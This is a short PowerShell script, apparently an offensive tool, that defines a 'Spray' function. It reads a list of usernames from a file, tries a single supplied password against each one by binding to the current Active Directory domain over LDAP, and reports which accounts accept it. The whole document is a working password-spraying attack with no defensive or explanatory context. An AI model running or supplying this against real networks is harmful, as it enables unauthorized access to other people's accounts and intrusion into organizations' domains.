function Spray {

	Param( [Parameter(Mandatory)] [string]$User, [Parameter(Mandatory)][string]$Password)

	$SearchString = "LDAP://" + ([ADSI]"").distinguishedName
	
	$Usersfile = get-content $User
	foreach ($name in $Usersfile){
		$res = (New-Object DirectoryServices.DirectoryEntry $SearchString,$name,$Password) 
		if($res.name -eq $null){
		    Write-Host "Invalid Creds!"
		    }
		else{
		    Write-Host "Found Valid Creds! for user "$name
			}
	}
}
